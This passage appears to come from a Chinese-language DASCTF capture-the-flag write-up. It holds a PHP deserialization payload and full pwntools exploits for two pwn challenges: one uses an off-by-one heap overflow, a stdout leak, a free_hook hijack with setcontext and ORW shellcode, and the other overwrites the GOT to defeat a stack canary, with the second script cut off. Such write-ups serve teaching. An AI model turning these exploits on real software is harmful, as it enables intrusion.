<span class="x">where";s:5:"molly";s:13:"dont_tell_you";s:5:"dimoo";s:13:"you_can_guess";}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="err">GET：p0pmart.php?wq=二仙桥</span>

<span class="err">POST：pucky=O:7:"popmart":3:{s:4:"yuki";s:13:"tell me where";s:5:"molly";s:13:"dont_tell_you";s:5:"dimoo";s:13:"you_can_guess";}&amp;where_you_go=dont_tell_you</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776220956-9f9769e1-3d52-44e6-8b87-da94d30408df.png"/></p>
<h2 data-content="1" id="5e89b408aefc30a0f3e812a0cc741c74">PWN</h2>
<h3 data-content="1" id="cc670e3f3d48ab4105b170f675714508">EZheap_2</h3>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776221157-d384e336-4455-4a0f-99e3-4a1f24128bcb.png"/></p>
<p>保护全开。</p>
<p>对于edit函数：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776221374-d049f4e3-f9ff-4f79-9b9c-ccd230d9273f.png"/></p>
<p>edit函数存在off-by-one漏洞。可以先布置堆风水，然后来进行后面一系列操作。</p>
<p>对于show函数;</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776221562-40998918-7eb8-4369-b4e0-ba034efb5961.png"/></p>
<p>这里通过减去0x202160可以泄露代码段的基地址。</p>
<p><strong>思路：</strong></p>
<p>利用off-by-one漏洞泄露出程序代码段的基地址，然后<strong>&lt;font style="color:#4D4D4D;"&gt;劫持_IO_2_1_stdout_泄露libc.&lt;/font&gt;</strong></p>&lt;font style="color:#4D4D4D;"&gt;
<p>&lt;font style="color:#4D4D4D;"&gt;由于本题禁用了execve，所以不能用system和onegadget这类的函数。可以考虑打ORW，&lt;/font&gt;</p>&lt;font style="color:#4D4D4D;"&gt;
<p>&lt;font style="color:#1A2029;"&gt;修改&lt;font style="color:#1A2029;"&gt;free_hook&lt;font style="color:#1A2029;"&gt;的值，控制程序执行流程。使用&lt;font style="color:#1A2029;"&gt;setcontext&lt;font style="color:#1A2029;"&gt;函数来劫持栈，这是因为在某些版本的glibc中，&lt;font style="color:#1A2029;"&gt;setcontext&lt;font style="color:#1A2029;"&gt;可以用来执行任意代码&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;</p>&lt;font style="color:#1A2029;"&gt;&lt;font style="color:#1A2029;"&gt;&lt;font style="color:#1A2029;"&gt;
<p>&lt;font style="color:#4D4D4D;"&gt;把shell写到free_hook周围，jmp过去执行我们的shellcode。&lt;/font&gt;</p>&lt;font style="color:#4D4D4D;"&gt;
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776221934-0173407f-161b-4b1d-b112-681097afd50a.png"/></p>
<p>如上可知libc偏移是0x3ed8b0,之后就按照思路打就行了</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context(log_level='debug',arch='i386', os='linux')</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">)</span>


<span class="n">pwnfile</span> <span class="o">=</span> <span class="s2">"./ezheap"</span>
<span class="c1"># io = remote("139.155.126.78",24982)</span>
<span class="c1"># io = process(pwnfile)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">pwnfile</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">address</span><span class="p">,</span><span class="n">data</span>       <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'</span><span class="si">%s</span><span class="s1">: '</span><span class="o">%</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xe3b04</span><span class="p">,</span><span class="mh">0xe3b01</span><span class="p">,</span><span class="mh">0xe3afe</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Your choice:"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Size:"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Your choice:"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"context: "</span><span class="p">)</span>
    <span class="n">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Your choice:"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>   
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Your choice:"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">"choose:"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>  <span class="c1">#0</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>  <span class="c1">#1</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>  <span class="c1">#2</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>  <span class="c1">#3</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xe1</span><span class="p">))</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">main_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x202160</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"main_addr-------------&gt;: "</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x68</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="o">+</span><span class="mh">0x202020</span><span class="p">))</span> 
    <span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x68</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">libc_base</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3ed8b0</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"libc_base-------------------&gt;: "</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

    <span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rdi</span><span class="se">\n</span><span class="s2">ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rsi</span><span class="se">\n</span><span class="s2">ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rdx</span><span class="se">\n</span><span class="s2">ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">rax</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rax</span><span class="se">\n</span><span class="s2">ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">syscall</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"syscall</span><span class="se">\n</span><span class="s2">ret"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">jmp_rsp</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"jmp rsp"</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
    <span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
    <span class="n">setcontext</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span><span class="o">+</span><span class="mi">53</span>
    <span class="n">open_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'open'</span><span class="p">]</span>
    <span class="n">read_addr</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
    <span class="n">write_addr</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>

    <span class="n">payload</span><span class="o">=</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x68</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>


    <span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xc1</span><span class="p">))</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x58</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span> 
    <span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">setcontext</span><span class="p">))</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
    <span class="n">payload</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1">#mprotect(free_hook&amp;0xfffffffffffff000,0x1000,7)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">free_hook</span><span class="o">+</span><span class="mh">0x300</span><span class="p">,</span><span class="mh">0x30</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">free_hook</span><span class="o">+</span><span class="mh">0x300</span><span class="p">,</span><span class="mh">0x30</span><span class="p">))</span>

    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">itr</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># io = process(pwnfile)</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"139.155.126.78"</span><span class="p">,</span><span class="mi">28809</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">pwn</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>DASCTF{17426987630018936403289199453850}</p>
<h3 data-content="1" id="f9687a489aef6f081e71b792e2d3c6ad">Inequable_Canary</h3>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776222253-7ad3be93-dfc0-4e05-886a-659b30df3c11.png"/></p>
<p>这里改retaddr为vuln的地址。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776222576-5d35ffae-be3e-4935-a6b8-92e7bc28e70d.png"/></p>
<p>这里有个任意地址写的漏洞和栈溢出的漏洞。把__stack_chk_fail改成vuln中ret的地址，当程序报错时任然会执行后面的代码进而栈溢出。</p>
<p>然后本题能写shellcode，还有个jmp_rsp的指令。所以在栈上布置我们的shellcode，然后jmp跳到我们的shell上执行代码，拿到shell</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context(log_level='debug',arch='i386', os='linux')</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">)</span>


<span class="n">pwnfile</span> <span class="o">=</span> <span class="s2">"./canary"</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"139.155.126.78"</span><span class="p">,</span><span class="mi">25663</span><span class="p">)</span>
<span class="c1"># io = process(pwnfile)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">pwnfile</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc/libc-2.31.so"</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>         <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">address</span><span class="p">,</span><span class="n">data</span>       <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'</span><span class="si">%s</span><span class="s1">: '</span><span class="o">%</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xe3b04</span><span class="p">,</span><span class="mh">0xe3b01</span><span class="p">,</span><span class="mh">0xe3afe</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>

<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'vuln'</span><span class="p">]</span>
<span class="n">stack_chk_fail_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'__stack_chk_fail'</span><span class="p">]</span>
<span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40081B</span>

<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Say some old spells to start the journey</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400820</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

